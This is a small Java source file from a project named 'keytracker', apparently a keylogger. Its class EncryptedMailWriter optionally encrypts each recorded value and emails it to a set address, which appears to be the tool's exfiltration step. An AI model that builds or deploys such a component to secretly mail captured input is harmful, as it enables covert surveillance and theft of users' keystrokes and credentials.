package com.keytracker.file;

import com.keytracker.encrypt.Encryptor;
import com.keytracker.mail.MailSender;

@Deprecated
public class EncryptedMailWriter extends MyMailWriter {

    private final Encryptor encryptor;

    public EncryptedMailWriter(MailSender mailSender, String to, Encryptor encryptor) {
        super(mailSender, to);
        this.encryptor = encryptor;
    }

    @Override
    public void write(String value) {
        String encryptedValue = encryptValue(value, encryptor);
        mailSender.send(encryptedValue, to);
    }

    private String encryptValue(String value, Encryptor encryptor) {
        return encryptor != null ? encryptor.encrypt(value) : value;
    }
}
